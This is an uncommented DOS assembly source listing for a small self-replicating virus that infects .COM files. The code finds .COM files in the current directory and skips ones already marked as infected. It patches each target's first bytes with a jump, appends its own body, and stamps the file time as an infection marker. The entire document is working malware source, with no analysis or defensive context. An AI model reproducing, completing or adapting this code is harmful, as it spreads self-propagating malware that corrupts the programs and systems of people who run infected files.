           .MODEL tiny
       .186
           .stack
           .code
           org 100h
   start:
          jmp sec
          nop
   ser:
   vir    DB "*.com",00h
   jamp   DB 0e9h,000h,000h
   jomp   DB 0cdh,020h,000h
   sec:
          Call fig
   Fig:
          Pop Bp
          Sub Bp,112h
          Mov Di,100h
          Lea Si,jomp+[Bp]
          Movsb
          Movsw
          mov ah,4eh
          Lea dx,vir+[Bp]
          int 21h
   wer:
          Cmp byte ptr cs:[0a4h],'D'
          Jz fn
          Cmp byte ptr cs:[096h],33h
          Jnz late
   fn:
          Mov ah,4fh
          Int 21h
          Cmp al,12h
          Jz lsd
          Jmp wer
   late:
          Mov Ax,3d02h
          Mov Dx,09eh
          Int 21h
          Jz lsd
          Xchg Ax,Bx
          Mov Ax,4301h
          Mov Cx,0020h
          Int 21h
          Mov Ax,4200h
          Call lit
          Mov Ah,3fh
          Mov Cx,003h
          Lea Dx,jomp+[Bp]
          Int 21h
          Mov Ax,4200h
          Call lit
          Mov Ax,word ptr cs:[9ah]
          Add Ax,09h
          Mov word ptr Jamp+[Bp]+1,Ax
          Lea Dx,[Bp]+jamp
          Mov Ah,40h
          Mov Cx,03h
          Int 21h
          Mov Ax,4202h
          Call lit
          Lea Dx,[Bp]+ser
          Mov Ah,40h
          Mov Cx,0b2h
          Int 21h
          Mov Ax,5701h
          Mov Cl,33h
          Mov Dx,Cs:[88h]
          Int 21h
   lsd:
          Mov word ptr Cs:[80h],0000h
          Mov Ah,3eh
          Int 21h
          Push 100h
          Ret


   lit:
           Xor Cx,Cx
       Xor Dx,Dx
       Int 21h
       Ret

   END start
   END
